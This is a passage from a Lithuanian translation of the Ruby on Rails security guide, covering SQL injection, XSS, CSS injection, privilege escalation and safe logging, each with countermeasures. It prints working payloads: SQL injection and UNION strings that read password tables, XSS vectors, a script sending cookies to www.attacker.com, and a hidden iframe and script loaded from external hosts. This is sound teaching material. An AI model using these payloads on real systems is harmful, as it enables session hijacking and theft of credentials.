Dėl šios priežasties dauguma interneto aplikacijų rodo bendrą klaidos pranešimą "vartotojo vardas arba slaptažodis neteisingas", jei vienas iš šių duomenų yra neteisingas. Jei būtų rodomas pranešimas "įvestas vartotojo vardas nerastas", puolėjas galėtų automatiškai sudaryti vartotojų sąrašą.

Tačiau dauguma interneto aplikacijų kūrėjų pamiršta pamiršto slaptažodžio puslapius. Šie puslapiai dažnai patvirtina, ar įvestas vartotojo vardas ar el. pašto adresas yra rastas arba nerastas. Tai leidžia puolėjui sudaryti vartotojų sąrašą ir priverstinai išbandyti paskyras.

Norint sumažinti tokių atakų riziką, _puslapiuose, skirtuose pamirštiems slaptažodžiams, taip pat rodykite bendrą klaidos pranešimą_. Be to, galite _reikalauti įvesti CAPTCHA po tam tikro skaičiaus nesėkmingų prisijungimų iš tam tikros IP adreso_. Tačiau atkreipkite dėmesį, kad tai nėra visiškai patikimas sprendimas prieš automatinės programos, nes šios programos gali keisti savo IP adresą taip pat dažnai. Tačiau tai padidina atakos barjerą.
### Paskyrimo pavogimas

Daugelis interneto programų palengvina vartotojų paskyrų pavogimą. Kodėl gi nesiskirti ir padaryti tai sunkiau?

#### Slaptažodžiai

Pagalvokite apie situaciją, kai puolėjas pavogė vartotojo sesijos slapuką ir taip gali naudotis programa. Jei lengva pakeisti slaptažodį, puolėjas pavogs paskyrą vos keliais paspaudimais. Arba jei slaptažodžio keitimo forma yra pažeidžiama dėl CSRF, puolėjas galės pakeisti aukos slaptažodį, viliodamas ją į tinklalapį, kuriame yra sukurtas IMG žymė, kuri atlieka CSRF. Kaip priemonę nuo to, _padarykite slaptažodžio keitimo formas saugias nuo CSRF_. Be to, _reikalaukite, kad vartotojas įvestų seną slaptažodį keičiant jį_.

#### El. paštas

Tačiau puolėjas taip pat gali pavogti paskyrą pakeisdamas el. pašto adresą. Po to jie nueis į pamiršto slaptažodžio puslapį, o (galbūt naujas) slaptažodis bus išsiųstas į puolėjo el. pašto adresą. Kaip priemonę, _reikalaukite, kad vartotojas įvestų slaptažodį keičiant el. pašto adresą_.

#### Kiti

Priklausomai nuo jūsų interneto programos, gali būti daugiau būdų pavogti vartotojo paskyrą. Daugeliu atvejų tai padeda CSRF ir XSS. Pavyzdžiui, kaip CSRF pažeidžiamumas [Google pašte](https://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/). Šioje atakos koncepcijoje auka būtų viliojama į puolėjo valdomą svetainę. Šioje svetainėje yra sukurtas IMG žymė, kuri padaro HTTP GET užklausą ir pakeičia Google pašto filtrų nustatymus. Jei auka būtų prisijungusi prie Google pašto, puolėjas pakeistų filtrus, kad visi laiškai būtų persiunčiami į jų el. pašto adresą. Tai beveik taip žalinga kaip ir visa paskyros pavogimas. Kaip priemonę, _peržiūrėkite savo programos logiką ir pašalinkite visus XSS ir CSRF pažeidžiamumus_.

### CAPTCHA

INFORMACIJA: _CAPTCHA yra iššūkio-atsakymo testas, skirtas nustatyti, kad atsakymas nėra generuojamas kompiuterio. Jis dažnai naudojamas apsaugoti registracijos formas nuo puolėjų ir komentarų formas nuo automatinio šlamšto robotų, prašant vartotojo įvesti iškreiptos vaizdo raidžių. Tai yra teigiamoji CAPTCHA, tačiau yra ir neigiamoji CAPTCHA. Neigiamosios CAPTCHA idėja nėra įrodyti, kad vartotojas yra žmogus, bet atskleisti, kad robotas yra robotas._

Populiari teigiamos CAPTCHA API yra [reCAPTCHA](https://developers.google.com/recaptcha/), kuris rodo dvi iškreiptas žodžių nuotraukas iš senų knygų. Jis taip pat prideda kampuotą liniją, o ne iškreiptą foną ir didelį teksto iškraipymą, kaip ankstesnės CAPTCHA, nes pastarosios buvo pažeistos. Be to, naudojant reCAPTCHA padeda skaitmenizuoti senas knygas. [ReCAPTCHA](https://github.com/ambethia/recaptcha/) taip pat yra "Rails" įskiepis su tuo pačiu API pavadinimu.

API gausite du raktus, viešąjį ir privačiąjį, kuriuos turėsite įdėti į savo "Rails" aplinką. Po to galite naudoti recaptcha_tags metodą peržiūroje ir verify_recaptcha metodą valdiklyje. Jei patikrinimas nepavyksta, verify_recaptcha grąžins "false".
CAPTCHA problema yra tai, kad ji neigiamai veikia vartotojo patirtį. Be to, kai kurie regos sutrikimų turintys vartotojai pastebėjo, kad tam tikros iškreiptos CAPTCHA yra sunkiai skaitomos. Vis dėlto, teigiamos CAPTCHA yra vienas iš geriausių būdų užkirsti kelią visų rūšių robotams pateikti formas.

Dauguma robotų yra labai naivūs. Jie naršo internetą ir įveda savo šlamštą į kiekvieno rasto formos lauką. Neigiamos CAPTCHA pasinaudoja tuo ir įtraukia "medaus puodą" lauką formoje, kuris žmogui bus paslėptas naudojant CSS ar JavaScript.

Atkreipkite dėmesį, kad neigiamos CAPTCHA yra veiksmingos tik prieš naivius robotus ir nepakanka apsaugoti kritines programas nuo tikslinių robotų. Vis dėlto, neigiamąją ir teigiamąją CAPTCHA galima derinti, siekiant padidinti našumą, pvz., jei "medaus puodo" laukas nėra tuščias (aptiktas robotas), jums nereikės patikrinti teigiamos CAPTCHA, kuri reikalautų HTTPS užklausos į Google ReCaptcha prieš apskaičiuojant atsakymą.

Čia pateikiamos keletas idėjų, kaip paslėpti "medaus puodo" laukus naudojant JavaScript ir/ar CSS:

* laukus padėkite už matomo puslapio srities
* padarykite elementus labai mažus arba nuspalvinkite juos tokiu pačiu fonu kaip ir puslapio fonas
* palikite laukus rodomus, bet žmonėms pasakykite juos palikti tuščius
Paprastiausias neigiamas CAPTCHA yra vienas paslėptas medaus puodas. Serverio pusėje patikrinsite lauko reikšmę: jei jame yra tekstas, tai turi būti robotas. Tada galite ignoruoti pranešimą arba grąžinti teigiamą rezultatą, bet neįrašydami pranešimo į duomenų bazę. Taip robotas bus patenkintas ir judės toliau.

Ned Batchelder tinklaraštyje galite rasti sudėtingesnių neigiamų CAPTCHA:

* Įtraukite lauką su dabartine UTC laiko žyma ir patikrinkite ją serveryje. Jei ji yra per sena arba jei ji yra ateityje, forma yra neteisinga.
* Atsitiktinai pakeiskite laukų pavadinimus
* Įtraukite daugiau nei vieną medaus puodo lauką visų tipų, įskaitant pateikimo mygtukus

Atkreipkite dėmesį, kad tai apsaugo tik nuo automatinių robotų, tačiau tai negali apsaugoti nuo tiksliai sukurto robotų. Todėl neigiamos CAPTCHA gali būti netinkamos prisijungimo formų apsaugai.

### Registravimas

ĮSPĖJIMAS: _Pasakykite "Rails" neįrašyti slaptažodžių į žurnalo failus._

Pagal numatytuosius nustatymus, "Rails" įrašo visus užklausimus, kurie yra siunčiami į interneto aplikaciją. Tačiau žurnalo failai gali būti didelė saugumo problema, nes jie gali turėti prisijungimo duomenis, kreditinių kortelių numerius ir pan. Projektuojant interneto aplikacijos saugumo koncepciją, taip pat turėtumėte pagalvoti, kas nutiks, jei įsilaužėlis gaus (visišką) prieigą prie interneto serverio. Slaptųjų ir slaptažodžių šifravimas duomenų bazėje bus bevertis, jei žurnalo failuose jie bus pateikti aiškia tekstu. Jūs galite _filtruoti tam tikrus užklausos parametrus iš žurnalo failų_, pridedant juos prie [`config.filter_parameters`][] programos konfigūracijoje. Šie parametrai bus pažymėti kaip [FILTERED] žurnale.

```ruby
config.filter_parameters << :password
```

PAVARDA: Pateikti parametrai bus išfiltruoti pagal dalinį atitikimą reguliariam išraiškų reiškiniui. "Rails" prideda sąrašą numatytųjų filtrų, įskaitant `:passw`, `:secret` ir `:token`, atitinkamame inicializavimo faile (`initializers/filter_parameter_logging.rb`), kad būtų galima tvarkyti tipinius programos parametrus, tokius kaip `password`, `password_confirmation` ir `my_token`.

### Reguliariosios išraiškos

INFORMACIJA: _Dažnas klaidos šaltinis "Ruby" reguliariųjų išraiškų naudojime yra pradžios ir pabaigos simbolių ^ ir $ naudojimas, o ne \A ir \z._

"Ruby" naudoja šiek tiek kitokį požiūrį nei daugelis kitų kalbų, kad atitiktų eilutės pradžią ir pabaigą. Dėl šios priežasties net daugelis "Ruby" ir "Rails" knygų tai daro klaidingai. Taigi kaip tai gali būti saugumo grėsmė? Tarkime, norėjote laisvai patikrinti URL lauką ir naudojote paprastą reguliariąją išraišką, panašią į šią:

```ruby
  /^https?:\/\/[^\n]+$/i
```

Tai gali gerai veikti kai kuriomis kalbomis. Tačiau _"Ruby" `^` ir `$` atitinka **eilutės** pradžią ir pabaigą_. Todėl URL, panašus į šį, praeina filtrą be problemų:

```
javascript:exploit_code();/*
http://hi.com
*/
```

Šis URL praeina filtrą, nes reguliari išraiška atitinka - antroji eilutė, likusioji nebeturi reikšmės. Įsivaizduokite, kad turime rodinį, kuriame URL atrodo taip:

```ruby
  link_to "Pagrindinis puslapis", @user.homepage
```

Nuoroda atrodo nekaltai lankytojams, tačiau ją paspaudus ji vykdys "exploit_code" JavaScript funkciją ar bet kokį kitą JavaScript, kurį pateikia įsilaužėlis.

Norint ištaisyti reguliariąją išraišką, vietoj `^` ir `$` turėtų būti naudojami `\A` ir `\z`, kaip parodyta žemiau:

```ruby
  /\Ahttps?:\/\/[^\n]+\z/i
```

Kadangi tai yra dažna klaida, formatavimo tikrinimo priemonė (validates_format_of) dabar iškelia išimtį, jei pateikta reguliari išraiška prasideda ^ arba baigiasi $. Jei tikrai reikia naudoti ^ ir $ vietoj \A ir \z (kas yra reta), galite nustatyti :multiline parinktį kaip true, kaip parodyta žemiau:

```ruby
  # turinys turi apimti eilutę "Tuo tarpu" bet kurioje eilutėje
  validates :content, format: { with: /^Tuo tarpu$/, multiline: true }
```

Atkreipkite dėmesį, kad tai apsaugo tik nuo dažniausios klaidos naudojant formatavimo tikrinimo priemonę - visada turite prisiminti, kad ^ ir $ atitinka **eilutės** pradžią ir pabaigą "Ruby", o ne eilutės pradžią ir pabaigą.

### Privilegijų eskalacija

ĮSPĖJIMAS: _Vieno parametro pakeitimas gali suteikti naudotojui neleistiną prieigą. Prisiminkite, kad kiekvienas parametras gali būti pakeistas, nepriklausomai nuo to, kaip jį slepiate ar apsunkinate._

Daugiausia naudotojas gali manipuliuoti parametru, tai yra id parametras, kaip pvz., `http://www.domain.com/project/1`, kur 1 yra id. Jis bus prieinamas parametruose kontroleryje. Ten, tikriausiai padarysite kažką panašaus į tai:
```ruby
@project = Project.find(params[:id])
```

Tai yra tinkama kai kurioms interneto programoms, bet tikrai ne, jei vartotojui neleidžiama peržiūrėti visų projektų. Jei vartotojas pakeis id į 42 ir jam neleidžiama matyti šios informacijos, jis vis tiek turės prieigą prie jos. Vietoj to, _patikrinkite ir vartotojo prieigos teises_:

```ruby
@project = @current_user.projects.find(params[:id])
```

Priklausomai nuo jūsų interneto programos, vartotojas gali keisti daugiau parametrų. Taisyklės pagalba, _nėra jokių garantijų, kad vartotojo įvesti duomenys yra saugūs, iki įrodyta priešingai, ir kiekvienas vartotojo parametras gali būti potencialiai manipuliuojamas_.

Nesiduokite apsaugos iliuzijai ir JavaScript apsaugai. Kūrėjo įrankiai leidžia peržiūrėti ir keisti kiekvieno formos paslėptus laukus. _JavaScript gali būti naudojamas tik patikrinti vartotojo įvestis, bet tikrai neapsaugoti nuo kenkėjiškų užklausų su netikėtomis reikšmėmis_. Mozilla Firefox naršyklės papildinys Firebug registruoja kiekvieną užklausą ir gali ją pakartoti ir pakeisti. Tai lengvas būdas apeiti bet kokias JavaScript patikrinimus. Be to, yra net klientinės pusės tarpininkai, kurie leidžia peržiūrėti ir keisti bet kurią užklausą ir atsakymą iš interneto.

Įterpimas
---------

INFORMACIJA: _Įterpimas yra atakų klasė, kurios metu į interneto programą įterpiamas kenksmingas kodas ar parametrai, kad jis būtų vykdomas pagal jos saugumo kontekstą. Pagrindiniai įterpimo pavyzdžiai yra kryžminis svetainių skriptų įterpimas (XSS) ir SQL įterpimas._

Įterpimas yra labai sudėtingas, nes tas pats kodas ar parametras gali būti kenksmingas viename kontekste, bet visiškai nekenksmingas kitame. Kontekstas gali būti skriptinė, užklausos ar programavimo kalba, komandinė eilutė arba Ruby/Rails metodas. Tolimesniuose skyriuose bus aptarti visi svarbūs kontekstai, kuriuose gali įvykti įterpimo atakos. Tačiau pirmasis skyrius aptars architektūrinį sprendimą, susijusį su įterpimu.

### Leidžiamos sąrašai prieš apribotus sąrašus

PASTABA: _Kai dezinfekuojate, apsaugojate ar tikrinote kažką, geriau naudoti leidžiamus sąrašus nei apribotus sąrašus._

Apribotas sąrašas gali būti sąrašas blogų el. pašto adresų, neviešų veiksmų ar blogų HTML žymų. Tai priešinga leidžiamam sąrašui, kuriame nurodomi geri el. pašto adresai, vieši veiksmai, geri HTML žymos ir t.t. Nors kartais neįmanoma sukurti leidžiamo sąrašo (pavyzdžiui, šlamšto filtrui), _geriau naudoti leidžiamų sąrašų požiūrį_:

* Naudojant `before_action except: [...]` vietoj `only: [...]` saugumo veiksmams. Taip nepamiršite įjungti saugumo patikrinimų naujai pridėtiems veiksmams.
* Leiskite `<strong>` vietoj `<script>` prieš kryžminio svetainių skriptų įterpimą (XSS). Išsamiau žr. žemiau.
* Nenustatykite vartotojo įvesties naudodami apribotus sąrašus:
    * Tai leis atakai veikti: `"<sc<script>ript>".gsub("<script>", "")`
    * Bet atmesti netinkamą įvestį

Leidžiami sąrašai taip pat yra geras požiūris prieš žmogaus veiksnį, kad nieko nepraleistumėte apribotame sąraše.

### SQL Įterpimas

INFORMACIJA: _Dėka išradingų metodų, tai yra mažai tikėtina problema daugumoje Rails programų. Tačiau tai yra labai žalinga ir dažna ataka interneto programose, todėl svarbu suprasti šią problemą._

#### Įvadas

SQL įterpimo atakos siekia paveikti duomenų bazės užklausas manipuliuojant interneto programos parametrais. Populiari SQL įterpimo atakų tikslas yra apieiti autorizaciją. Kitas tikslas yra atlikti duomenų manipuliavimą arba skaityti bet kokius duomenis. Štai pavyzdys, kaip netinkamai naudoti vartotojo įvesties duomenis užklausoje:

```ruby
Project.where("name = '#{params[:name]}'")
```

Tai galėtų būti paieškos veiksmas, kuriame vartotojas gali įvesti projekto pavadinimą, kurį nori rasti. Jei kenksmingas vartotojas įves `' OR 1) --`, rezultatu gauta SQL užklausa bus:

```sql
SELECT * FROM projects WHERE (name = '' OR 1) --')
```

Dvi brūkšniai pradeda komentarą, ignoruojantį viską po jų. Taigi užklausa grąžina visus įrašus iš projekto lentelės, įskaitant tuos, kurie yra nematomi vartotojui. Tai yra todėl, kad sąlyga yra teisinga visiems įrašams.

#### Autorizacijos apieiga

Paprastai interneto programa apima prieigos kontrolę. Vartotojas įveda prisijungimo duomenis, o interneto programa bando rasti atitinkamą įrašą vartotojų lentelėje. Kai programa randa įrašą, ji suteikia prieigą. Tačiau atakotojas gali įmanoma apieiti šią patikrą naudodamas SQL įterpimą. Žemiau pateikiamas tipinės duomenų bazės užklausos pavyzdys Rails, skirtas rasti pirmąjį įrašą vartotojų lentelėje, kuris atitinka vartotojo pateiktus prisijungimo duomenis.
```ruby
User.find_by("login = '#{params[:name]}' AND password = '#{params[:password]}'")
```

Jei puolėjas įveda `' OR '1'='1` kaip vardą ir `' OR '2'>'1` kaip slaptažodį, rezultatuojantis SQL užklausa bus:

```sql
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
```

Tai tiesiog ras pirmą įrašą duomenų bazėje ir suteiks prieigą šiam vartotojui.

#### Nepageidaujamas skaitymas

UNION sakinys sujungia du SQL užklausas ir grąžina duomenis viename rinkinyje. Puolėjas gali jį naudoti, kad perskaitytų bet kokius duomenis iš duomenų bazės. Paimkime pavyzdį iš aukščiau:

```ruby
Project.where("name = '#{params[:name]}'")
```

O dabar įterpkime kitą užklausą naudodami UNION sakinį:

```
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
```

Tai rezultuos šioje SQL užkloje:

```sql
SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --'
```

Rezultatas nebus projektų sąrašas (nes nėra projekto su tuščiu pavadinimu), bet vartotojų vardų ir slaptažodžių sąrašas. Tad tikiuosi, kad jūs [saugiai užšifruojate slaptažodžius](#vartotojų-valdymas) duomenų bazėje! Vienintelis problema puolėjui yra tai, kad abiejose užklausose turi būti tokia pati stulpelių skaičius. Todėl antroje užkloje įtraukiamas vienetų (1) sąrašas, kuris visada bus reikšmė 1, kad atitiktų pirmosios užklausos stulpelių skaičių.

Taip pat, antroji užklausa pervadina kai kuriuos stulpelius naudojant AS sakinį, kad interneto aplikacija rodytų reikšmes iš vartotojų lentelės. Būkite tikri, kad atnaujinote savo Rails [bent jau iki 2.1.1](https://rorsecurity.info/journal/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter.html).

#### Kontrpriemonės

Ruby on Rails turi įmontuotą filtrą specialiems SQL simboliams, kuris išvengia `'`, `"`, NULL simbolio ir naujos eilutės. *Naudodami `Model.find(id)` arba `Model.find_by_something(something)` automatiškai taikoma ši kontrpriemonė*. Tačiau SQL fragmentuose, ypač *sąlygų fragmentuose (`where("...")`), `connection.execute()` arba `Model.find_by_sql()` metodais, ją reikia taikyti rankiniu būdu*.

Vietoje perduoti eilutę, galite naudoti pozicinius parametrus, kad išvalytumėte užterštą eilutę taip:

```ruby
Model.where("zip_code = ? AND quantity >= ?", entered_zip_code, entered_quantity).first
```

Pirmasis parametras yra SQL fragmentas su klaustukais. Antrasis ir trečiasis
parametras pakeis klaustukus kintamųjų reikšmėmis.

Taip pat galite naudoti vardinius parametrus, reikšmės bus paimtos iš naudojamo hash'o:

```ruby
values = { zip: entered_zip_code, qty: entered_quantity }
Model.where("zip_code = :zip AND quantity >= :qty", values).first
```

Be to, galite padalinti ir grandinėti sąlygas, kurios yra tinkamos jūsų atvejui:

```ruby
Model.where(zip_code: entered_zip_code).where("quantity >= ?", entered_quantity).first
```

Atkreipkite dėmesį, kad anksčiau minėtos kontrpriemonės yra prieinamos tik modelio instancėse. Galite išbandyti [`sanitize_sql`][] kitur. _Įpraskite mąstyti apie saugumo padarinius, kai naudojate išorinę eilutę SQL užkloje_.


### Cross-Site Scripting (XSS)

INFO: _Plačiausiai paplitęs ir vienas iš žalingiausių saugumo pažeidimų interneto aplikacijose yra XSS. Šis kenksmingas puolimas įterpia vykdomąjį kliento pusės kodą. Rails teikia pagalbos metodus, skirtus apsisaugoti nuo šių puolimų._

#### Įėjimo taškai

Įėjimo taškas yra pažeidžiama URL ir jo parametrai, kuriuose puolėjas gali pradėti puolimą.

Dažniausiai pasitaikančios įėjimo taškos yra žinučių skelbimai, vartotojų komentarai ir svečių knygos, tačiau pažeidžiamos gali būti ir projekto pavadinimai, dokumentų pavadinimai ir paieškos rezultatų puslapiai - praktiškai visur, kur vartotojas gali įvesti duomenis. Tačiau įvestis nebūtinai turi ateiti iš įvesties laukų svetainėse, ji gali būti bet kuriame URL parametre - aiškiame, paslėptame ar vidiniame. Atminkite, kad vartotojas gali perimti bet kokį srautą. Aplikacijos arba kliento pusės tarpininkai lengvai keičia užklausas. Taip pat yra kitų puolimo vektorių, pvz., banerinių reklamų.

XSS puolimai veikia taip: puolėjas įterpia tam tikrą kodą, interneto aplikacija jį išsaugo ir rodo puslapyje, vėliau pateikiamame aukai. Dauguma XSS pavyzdžių tiesiog rodo perspėjimo langą, tačiau tai yra galingesnis nei tai. XSS gali pavogti slapuką, užgrobti sesiją, nukreipti auką į suklastotą svetainę, rodyti reklamas puolėjui naudingais tikslais, keisti elementus svetainėje, kad gautų konfidencialią informaciją arba įdiegtų kenksmingą programinę įrangą per saugumo spragas interneto naršyklėje.

2007 m. antroje pusėje buvo pranešta apie 88 pažeidžiamumus „Mozilla“ naršyklėse, 22 „Safari“, 18 „IE“ ir 12 „Opera“. Symantec Global Internet Security grėsmių ataskaitoje taip pat dokumentuota 239 naršyklės įskiepių pažeidžiamumų per paskutinius 2007 m. šešis mėnesius. [Mpack](https://www.pandasecurity.com/en/mediacenter/malware/mpack-uncovered/) yra labai aktyvus ir nuolat atnaujinamas puolimo pagrindas, kuris išnaudoja šiuos pažeidžiamumus. Kriminaliniams hakeriams yra labai patrauklu išnaudoti SQL-Injection pažeidžiamumą interneto aplikacijų pagrindu ir įterpti kenksmingą kodą į kiekvieną tekstinį lentelės stulpelį. 2008 m. balandžio mėn. buvo įsilaužta į daugiau nei 510 000 svetainių, tarp jų britų vyriausybė, Jungtinės Tautos ir daug kitų žinomų tikslų.
#### HTML/JavaScript įterpimas

Žinoma, populiariausia klientinės pusės skriptinė kalba yra JavaScript, dažnai kartu su HTML. _Būtina išvengti vartotojo įvesties įterpimo_.

Štai paprasčiausias testas, skirtas patikrinti XSS:

```html
<script>alert('Hello');</script>
```

Šis JavaScript kodas tiesiog rodo įspėjimo langą. Kiti pavyzdžiai daro tą patį, tik labai netipiškose vietose:

```html
<img src="javascript:alert('Hello')">
<table background="javascript:alert('Hello')">
```

##### Slapukų vagystė

Šie pavyzdžiai kol kas nesukelia jokios žalos, todėl pažiūrėkime, kaip puolėjas gali pavogti vartotojo slapuką (ir taip pavogti vartotojo sesiją). JavaScript naudojant `document.cookie` savybę galima skaityti ir rašyti dokumento slapukus. JavaScript taiko tą pačią kilmės politiką, tai reiškia, kad vieno domeno skriptas negali pasiekti kitų domeno slapukų. `document.cookie` savybė laiko kilmės internetinio serverio slapuką. Tačiau galite skaityti ir rašyti šią savybę, jei įterpiate kodą tiesiogiai į HTML dokumentą (kaip ir XSS atveju). Įterpkite tai bet kurioje savo internetinės programos vietoje, kad pamatytumėte savo slapuką rezultatų puslapyje:

```html
<script>document.write(document.cookie);</script>
```

Žinoma, tai nenaudinga puolėjui, nes auka matys savo slapuką. Kitas pavyzdys bandys įkelti vaizdą iš URL http://www.attacker.com/ kartu su slapuku. Žinoma, šis URL neegzistuoja, todėl naršyklė nieko nerodo. Tačiau puolėjas gali peržiūrėti savo internetinio serverio prieigos žurnalo failus ir pamatyti aukos slapuką.

```html
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
```

www.attacker.com žurnalo failai atrodys taip:

```
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
```

Galite sumažinti šiuos puolimus (akivaizdžiu būdu), pridedant **httpOnly** žymą prie slapukų, kad `document.cookie` nebūtų galima skaityti naudojant JavaScript. HTTP tik slapukai gali būti naudojami nuo IE v6.SP1, Firefox v2.0.0.5, Opera 9.5, Safari 4 ir Chrome 1.0.154 versijų. Tačiau kiti, senesni naršyklių (pvz., WebTV ir IE 5.5 Mac) gali sukelti puslapio įkėlimo nesėkmę. Būkite įspėti, kad slapukai [vis tiek bus matomi naudojant Ajax](https://owasp.org/www-community/HttpOnly#browsers-supporting-httponly).

##### Suteršimas

Suteršus interneto puslapį, puolėjas gali padaryti daugybę dalykų, pavyzdžiui, pateikti netikrą informaciją arba suklaidinti auką, nukreipdamas ją į savo interneto svetainę, kad pavogtų slapuką, prisijungimo duomenis ar kitus jautrius duomenis. Populiariausias būdas yra įtraukti kodą iš išorinių šaltinių naudojant iframes:

```html
<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
```

Tai įkelia bet kokį HTML ir/arba JavaScript iš išorinio šaltinio ir įterpia jį kaip svetainės dalį. Šis `iframe` paimtas iš tikrųjų puolimo prieš teisėtus Italijos svetainių naudojant [Mpack puolimo rėmą](https://isc.sans.edu/diary/MPack+Analysis/3015). Mpack bando įdiegti kenksmingą programinę įrangą per saugumo spragas naršyklėje - labai sėkmingai, 50% puolimų pavyksta.

Specializuotesnis puolimas galėtų uždengti visą interneto svetainę arba rodyti prisijungimo formą, kuri atrodo taip pat kaip ir svetainės originali, bet perduoda naudotojo vardą ir slaptažodį į puolėjo svetainę. Arba tai gali naudoti CSS ir/arba JavaScript, kad paslėptų teisėtą nuorodą internetinėje programoje ir rodytų kitą vietą, kuri nukreipia į netikrą svetainę.

Atspindėti įterpimo puolimai yra tie, kai įterpimo dalis nėra saugoma, kad vėliau būtų pateikta aukai, bet įtraukiama į URL. Ypač paieškos formos nesugeba išvengti paieškos eilutės. Ši nuoroda pateikė puslapį, kuriame teigiama, kad "George Bush paskyrė 9 metų berniuką pirmininku...":

```
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--
```

##### Gynyba

_Itin svarbu filtruoti kenksmingą įvestį, tačiau taip pat svarbu apsaugoti interneto programos išvestį_.

Ypač XSS atveju svarbu daryti _leistiną įvesties filtravimą, o ne ribotą_. Leistinų sąrašų filtravimas nurodo leistinas reikšmes, priešingai nei neleistinos reikšmės. Riboti sąrašai niekada nėra išsamūs.

Įsivaizduokite, kad ribotas sąrašas ištrina `"script"` iš vartotojo įvesties. Dabar puolėjas įterpia `"<scrscriptipt>"`, o po filtro lieka `"<script>"`. Ankstesnės Rails versijos naudojo riboto sąrašo požiūrį `strip_tags()`, `strip_links()` ir `sanitize()` metodams. Todėl buvo galima įterpti tokią injekciją:

```ruby
strip_tags("some<<b>script>alert('hello')<</b>/script>")
```

Tai grąžino `"some<script>alert('hello')</script>"`, dėl ko puolimas veikė. Todėl leistinų sąrašų požiūris yra geresnis, naudojant atnaujintą Rails 2 metodą `sanitize()`:
```ruby
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))
```

Tai leidžia tik nurodytus žymenis ir gerai susidoroja su visais triukais ir netinkamais žymenimis.

Kaip antrą žingsnį, _gera praktika yra išvengti visų programos išvesties pateikimo_, ypač kai vartotojo įvestis vėl rodoma, ir ji nebuvo filtruota (kaip pavyzdžiui, paieškos formos pavyzdyje anksčiau). Naudokite `html_escape()` (arba jo sinonimą `h()`) metodą, kad pakeistumėte HTML įvesties simbolius `&`, `"`, `<` ir `>` jų neatpažintais atvaizdavimais HTML (`&amp;`, `&quot;`, `&lt;`, ir `&gt;`).

##### Užkoduotų ir įterpimo įterpimas

Tinklo srautas pagrįstas daugiausia ribotu Vakarų abėcėle, todėl atsirado nauji simbolių kodavimai, tokie kaip Unicode, skirti simboliams perdavimui kitomis kalbomis. Tačiau tai taip pat yra grėsmė interneto programoms, nes kenksmingas kodas gali būti paslėptas skirtinguose kodavimuose, kuriuos gali apdoroti interneto naršyklė, bet ne interneto programa. Čia yra atakos vektorius UTF-8 kodavimu:

```html
<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
```

Šis pavyzdys iššoka pranešimo langą. Tačiau jis bus atpažintas aukščiau esančio `sanitize()` filtro. Puikus įrankis, skirtas užkoduoti ir užkoduoti eilutes, ir taip "pažinti savo priešą", yra [Hackvertor](https://hackvertor.co.uk/public). "Rails" `sanitize()` metodas puikiai apsaugo nuo kodavimo atakų.

#### Pavyzdžiai iš požemio

_Norint suprasti šiandieninius interneto programų atakas, geriausia pažvelgti į kelis realaus pasaulio atakos vektorius._

Štai ištrauka iš [Js.Yamanner@m Yahoo! Mail kirminų](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=12d8d106-1137-4d7c-8bb4-3ea1faec83fa). Jis pasirodė 2006 m. birželio 11 d. ir buvo pirmasis internetinės pašto sąsajos kirminas:

```html
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
```

Kirminai išnaudoja spragą "Yahoo" HTML/Javascript filtruose, kuris paprastai filtruoja visas tikslus ir onload atributus iš žymenų (nes gali būti Javascript). Filtras taikomas tik vieną kartą, todėl onload atributas su kirminų kodu lieka vietoje. Tai geras pavyzdys, kodėl ribotų sąrašų filtrai niekada nėra visiški ir kodėl sunku leisti HTML/Javascript interneto programoje.

Kitas koncepto įrodymas yra Nduja, kryžminis sritis kirminas, skirtas keturioms Italijos internetinėms pašto tarnyboms. Daugiau informacijos rasite [Rosario Valotta straipsnyje](http://www.xssed.com/news/37/Nduja_Connection_A_cross_webmail_worm_XWW/). Abiem internetinėms pašto kirminoms tikslas yra surinkti el. pašto adresus, tai, su kuo nusikaltėlis gali užsidirbti pinigų.

2006 m. gruodį buvo pavogta 34 000 tikrų vartotojo vardų ir slaptažodžių [MySpace phishingo ataku](https://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html) metu. Atakos idėja buvo sukurti profilio puslapį pavadinimu "login_home_index_html", todėl URL atrodė labai įtikinamai. Specialiai sukurta HTML ir CSS buvo naudojama, kad paslėptų tikrąjį MySpace turinį nuo puslapio ir vietoj jo rodytų savo prisijungimo formą.

### CSS įterpimas

INFORMACIJA: _CSS įterpimas iš tikrųjų yra JavaScript įterpimas, nes kai kurios naršyklės (IE, kai kurios Safari versijos ir kt.) leidžia JavaScript CSS. Du kartus pagalvokite, ar leisti pasirinktinį CSS savo internetinėje programoje._

CSS įterpimą geriausiai paaiškina gerai žinomas [MySpace Samy kirminas](https://samy.pl/myspace/tech.html). Šis kirminas automatiškai išsiuntė draugystės užklausą Samy (puolėjui), tiesiog apsilankius jo profilyje. Per kelias valandas jis gavo daugiau nei 1 milijoną draugystės užklausų, dėl ko MySpace buvo išjungtas. Štai techninė šio kirminų paaiškinimas.

MySpace užblokavo daugelį žymenų, bet leido CSS. Todėl kirminų autorius į CSS įdėjo JavaScript kaip tai:

```html
<div style="background:url('javascript:alert(1)')">
```

Taigi, apkrova yra stiliaus atributas. Bet apkrovai neleidžiama naudoti kabučių, nes jau buvo naudotos viengubos ir dvigubos kabutės. Bet JavaScript turi patogų `eval()` funkciją, kuri vykdo bet kokį eilutę kaip kodą.

```html
